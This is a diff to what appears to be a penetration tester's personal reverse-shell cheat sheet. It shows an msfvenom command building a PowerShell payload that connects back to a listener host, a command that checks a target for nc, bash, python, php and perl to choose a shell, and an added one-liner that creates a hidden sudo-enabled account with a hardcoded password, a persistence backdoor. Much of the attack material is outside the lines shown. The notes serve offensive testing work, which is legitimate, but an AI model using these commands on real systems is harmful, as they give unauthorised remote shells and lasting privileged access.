@@ -1,5 +1,3 @@
-
-
 # The cheap way
 
 1. Build payload and launch handler according to https://pentest.ws/tools/venom-builder 
@@ -39,6 +37,11 @@ msfvenom --payload $payload LHOST=$hip LPORT=$hport --format psh | msfvenom --pa
 
 [Shell Folder](file:////home/kali/Documents/shells/)
 
+## Determine compatibility
+Linux:
+```bash
+whoami;echo ----------;bash --version;echo ----------;which nc;echo ----------;python --version;echo ----------;php --version;echo ----------;perl --version
+```
 ## Universal
 
 PHP (`php -r ''`)
@@ -202,9 +205,9 @@ exec /bin/bash
 ```
 
 
-# Other Payloads
+# Create Admin-User
 
-Create Admin-User with binary
+##### Windows
 ```c
 #include <stdlib.h>
 
@@ -218,5 +221,8 @@ int main ()
   return 0;
 }
 ```
-(See [[8_windowsCrosscompile]])
-
+(See [[8_crosscompile2windows_guide]])
+##### Linux
+```bash
+sudo adduser --system --shell /bin/bash --no-create-home us3r && echo -e 'Testp4ssw0rd\nTestp4ssw0rd' | sudo passwd us3r && sudo usermod -aG sudo us3r
+```
